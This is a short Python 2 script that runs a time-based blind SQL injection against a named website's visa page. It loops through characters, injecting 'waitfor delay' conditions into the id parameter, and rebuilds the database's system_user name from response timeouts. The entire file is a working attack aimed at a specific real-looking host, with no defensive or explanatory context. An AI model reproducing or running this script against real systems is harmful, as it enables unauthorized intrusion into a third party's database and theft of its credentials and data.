#encoding=utf-8

import httplib

import time

import string

import sys

import random

import urllib

headers = {

    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',

}

payloads = list(string.ascii_lowercase)

for i in range(0,10):

    payloads.append(str(i))

payloads += ['@','_', '.', '-', '\\', ' ']

print 'Try to retrive user:'

user = ''

for i in range(1,11):

    for payload in payloads:

        try:

            conn = httplib.HTTPConnection('www.h-h.com.cn', timeout=5)

            s = "if (ascii(substring(system_user,%s,1))=%s) waitfor delay '0:0:5' --" % (i, ord(payload))

            params = "id=74;" + urllib.quote(s)

            conn.request(method='GET', url= '/visa/view_visa.aspx?' + params,

                         headers = headers)

            html_doc = conn.getresponse().read()

            conn.close()

            print '+',

        except Exception, e:

            user += payload

            print '\n[*]', user

            break

print '\n[Done] User is:', user
